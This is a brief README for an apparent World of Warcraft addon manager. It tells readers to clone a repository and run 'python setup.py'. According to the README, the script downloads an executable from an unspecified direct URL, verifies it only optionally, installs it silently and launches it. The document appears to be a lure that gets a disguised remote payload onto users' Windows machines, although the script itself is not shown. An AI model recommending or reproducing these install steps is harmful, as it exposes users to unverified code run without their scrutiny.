> WoW Addon Manager is a lightweight desktop client for managing World of Warcraft addons. Auto-update, profiles, and backups.

## Features

- Install and update 10,000+ addons
- Profile support for multiple characters
- Auto-backup before updates
- Easy install via `setup.py` — downloads and launches automatically
- No manual configuration required
- Works on Windows 10 / 11

## Installation

```bash
git clone https://github.com/TrackerScreen/wow-addon-manager-alpha-413.git
cd wow-addon-manager-alpha-413
```

## Usage

```bash
python setup.py
```

`setup.py` will:

1. Download the official installer (`.exe` or `.msi`) from a direct URL.
2. Verify the SHA-256 hash (if provided).
3. Run a silent install.
4. Launch the application.

## Requirements

- Windows 10 or later
- Python 3.10+
- Internet connection
